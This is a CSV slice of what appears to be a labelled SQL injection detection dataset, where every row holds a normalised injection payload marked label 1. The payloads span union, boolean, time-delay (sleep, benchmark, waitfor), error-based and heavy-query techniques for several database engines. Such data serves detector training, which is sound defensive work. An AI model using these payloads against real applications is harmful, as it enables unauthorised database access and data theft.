row_index,payload_norm,label,sqli_type_hint
7140,"1' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'nqam' = 'nqam",1,
7141,-2174' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'dyyg' = 'dyyg,1,
7142,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""fvtu"" like ""fvtu",1,
7143,-4637' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1,
7144,"-2373%"" ) or 9323 = 9323#",1,
7145,1 ) and 2006 = 2006,1,
7146,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'osov' like 'osov",1,
7147,1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( '%' = ',1,
7148,"1 ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
7149,-5031' or 9323 = 9323#,1,
7150,"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",1,
7151,"-3361'|| ( select 'msfi' where 4806 = 4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1,
7152,1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'iwmy' = 'iwmy,1,
7153,1'+ ( select 'wyxu' where 2555 = 2555 union all select null#,1,
7154,"-8735' ) ) union all select 3262,3262,3262--",1,
7155,"-4248"" ) ) union all select 9450,9450,9450--",1,
7156,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'gfln' = 'gfln",1,
7157,"1%' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and '%' = '",1,
7158,"1"" ) ) as eagr where 3366 = 3366 and elt ( 4249 = 4249,7259 ) --",1,
7159,"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'tuzl' = 'tuzl",1,
7160,1 where 5311 = 5311 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
7161,"-7139"" ) where 2723 = 2723 or 3900 = 5082--",1,
7162,"1'+ ( select mcfb where 4050 = 4050 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",1,
7163,"-3109"" or elt ( 1032 = 1032,3623 )",1,
7164,1'+ ( select 'qsqs' where 9227 = 9227 waitfor delay '0:0:5' ) +',1,
7165,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'hofy' like 'hofy",1,
7166,1 ) ) as emtf where 3561 = 3561 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1,
7167,"-5245"" ) ) ) union all select 8106,8106,8106#",1,
7168,select ( case when ( 8716 = 1338 ) then 1 else 8716* ( select 8716 from master..sysdatabases ) end ) --,1,
7169,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'hryb' = 'hryb",1,
